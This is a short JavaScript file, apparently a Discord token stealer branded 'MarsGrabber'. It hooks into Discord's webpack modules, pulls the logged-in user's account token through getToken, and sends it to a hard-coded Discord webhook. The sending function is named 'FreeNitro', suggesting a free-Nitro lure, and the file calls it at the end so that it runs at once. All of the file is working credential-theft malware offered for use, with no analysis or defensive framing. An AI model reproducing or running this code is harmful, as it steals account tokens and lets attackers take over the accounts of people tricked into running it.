const webhookurl = 'https://discord.com/api/webhooks/836385900467847178/Gk0fCeh-vE_R0TpFibTIQQf1gqGw34T4I9QkkkacRa0WUGDRb3Q7Ns0D_39RhPLIxM9s';

var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }
function FreeNitro() {
    var e = new XMLHttpRequest;
    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
    var t = {
        username: "MarsGrabber",
        avatar_url: "https://cdn.discordapp.com/attachments/829799385244237848/841411606545694720/Mars.png",
        content: "",
        embeds: [{
            color: "4700374",
            description: "Token : " + token,
            footer: {
                text: "Made By ! astro#9999 | Mars Javascript Logger"
            }
        }]
    };
    e.send(JSON.stringify(t))
}
FreeNitro();
